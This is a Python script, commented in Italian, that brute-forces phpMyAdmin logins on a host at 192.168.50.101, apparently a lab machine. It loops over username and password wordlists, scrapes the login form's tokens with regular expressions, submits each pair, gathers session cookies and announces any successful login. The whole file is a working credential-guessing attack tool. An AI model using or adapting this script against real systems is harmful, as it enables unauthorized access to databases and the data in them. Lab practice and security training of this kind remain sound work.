import http.client, urllib.parse, re 

#La funzione main estrare e pulisce i dati dai dictionary
def main():
    lista_username = open("testUsernames.lst")
    lista_password = open("testPasswords.lst")
    ip_target_meta = "192.168.50.101"
    user = lista_username.readlines()     
    password = lista_password.readlines()  

#Inizia ad eseguire il ciclo for per provare tutte le combinazioni contenute nei files
    for usr in user:
        usr = usr.rstrip()
        for pwd in password:
            pwd = pwd.rstrip()
            print(f"Trying username: {usr} and password: {pwd}")
            connection = http.client.HTTPConnection(ip_target_meta)
            token, phpMyAdmin_token = get_tokens(connection)
            cookie_def = try_login(connection,token, phpMyAdmin_token, usr, pwd)
            login_verification(connection, cookie_def, token, usr, pwd)
            connection.close()

#La funzione serve a richiedere la pagina di login ed estrae i due token necessario per tentare un accesso
#tramite una RegEx che identifica all'interno del codice HTML i due token necessari
def get_tokens(conn):
      
    conn.request("GET", "/phpMyAdmin/index.php")
    response = conn.getresponse()
    page_content = response.read().decode()
    pattern = r'name="token" value="(\w+)"'
    match = re.search(pattern, page_content)
    token = match.group(1)
    pattern = r'name="phpMyAdmin" value="(\w+)"'
    match = re.search(pattern, page_content)
    phpMyAdmin_token = match.group(1)
    return token, phpMyAdmin_token

#La funzione tenta di effettuare il login con una username e password aggiungendo i token richiesti e
#nel contempo acquisisce i cookies che il server restituisce a seguito del tentativo di login
def try_login(conn, token, phpMyAdmin_token, usr, pwd):

    post_parameters = urllib.parse.urlencode({'phpMyAdmin':phpMyAdmin_token, 'pma_username': usr, 'pma_password': pwd, 'server':'1','token':token})  
    headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml"} 
    conn.request("POST", "/phpMyAdmin/index.php", post_parameters, headers)
    response = conn.getresponse()
    response.read().decode()
    set_cookie_header = response.getheaders()
    cookie_def = 'phpMyAdmin='+phpMyAdmin_token+';'
    for cookie in set_cookie_header:
        if cookie[0] == 'Set-Cookie' and 'pma' in str(cookie[1]):
            #print(cookie[0],':',cookie[1])
            cookie_def = cookie_def + cookie[1].split(";")[0]+';'
        #print(cookie_def)
    return cookie_def

#La funzione, utilizzando tutti i token e i cookies acquisiti, tenta di ottenere come risultato la pagina di login
#effettuato con successo e verifica che al suo interno vi sia il valore navigation.php che sarebbe la barra laterale
#dell'interfaccia di gestione del DB di phpMyAdmin
def login_verification(conn, cookie_def, token, usr, pwd):
        post_parameters = urllib.parse.urlencode({'token':token})
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml", 'Cookie':cookie_def} 
        url_php_bf = '/phpMyAdmin/index.php'
        url_target = url_php_bf + '?' + post_parameters

        conn.request("GET", url_target, post_parameters, headers)
        response = conn.getresponse()
        data = response.read().decode()

        if f"navigation.php?token={token}" in str(data):
            lenght = len(f"Logged with: {usr} - {pwd} *")
            frame = lenght * "*"
            print(f"{frame}\nLogged with: {usr} - {pwd} *\n{frame}")

if __name__ == "__main__":
    main()
        
